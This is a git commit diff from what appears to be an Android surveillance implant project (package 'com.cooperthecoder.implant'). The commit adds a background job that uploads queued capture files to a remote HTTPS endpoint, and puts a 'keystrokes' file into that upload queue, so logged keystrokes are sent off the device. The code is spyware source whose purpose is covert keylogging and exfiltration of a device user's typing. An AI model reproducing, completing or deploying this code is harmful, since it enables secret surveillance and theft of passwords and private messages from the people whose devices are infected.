be9f7ece308bcbc4ef8d7d5cc10214a7a080c142
Jonathan Cooper <cooper@cooperthecoder.com>
2017-07-06 11:08:18 -0500

    Added upload job

--- app/src/main/java/com/cooperthecoder/implant/command/UploadQueueJob.kt
+++ app/src/main/java/com/cooperthecoder/implant/command/UploadQueueJob.kt
@@ -1,6 +1,12 @@
 package com.cooperthecoder.implant.command
 
+import com.cooperthecoder.implant.App
+import com.cooperthecoder.implant.Config
+import com.cooperthecoder.implant.data.UploadQueue
 import com.evernote.android.job.Job
+import okhttp3.Request
+import okhttp3.RequestBody
+import java.io.File
 
 class UploadQueueJob : Job() {
 
@@ -10,6 +16,14 @@ class UploadQueueJob : Job() {
 
     override fun onRunJob(params: Params): Result {
         // Upload capture file to endpoint
+        val client = (context.applicationContext as App).httpClient
+        for (filename in UploadQueue.files()) {
+            val request = Request.Builder()
+                    .url(Config.HTTPS_ENDPOINT + "upload")
+                    .post(RequestBody.create(null, File(filename)))
+                    .build()
+            client.newCall(request).execute()
+        }
         return Result.SUCCESS
     }
 
--- app/src/main/java/com/cooperthecoder/implant/data/UploadQueue.kt
+++ app/src/main/java/com/cooperthecoder/implant/data/UploadQueue.kt
@@ -6,15 +6,20 @@ import java.io.File
 object UploadQueue {
 
     const val UPLOAD_QUEUE_NAME = "uploads"
+    const val KEYSTROKE_FILE_NAME = "keystrokes"
 
     private val file = File(Environment.getDataDirectory(), UPLOAD_QUEUE_NAME)
+    private val keystrokeFile = File(Environment.getDataDirectory(), KEYSTROKE_FILE_NAME)
 
     fun push(filename: String) {
         file.appendText("$filename\n")
     }
 
     fun files(): List<String> {
-        return file.readLines()
+        val files = listOf(
+                keystrokeFile.absolutePath
+        )
+        return files.plus(file.readLines())
     }
 
     fun clear(): Boolean {
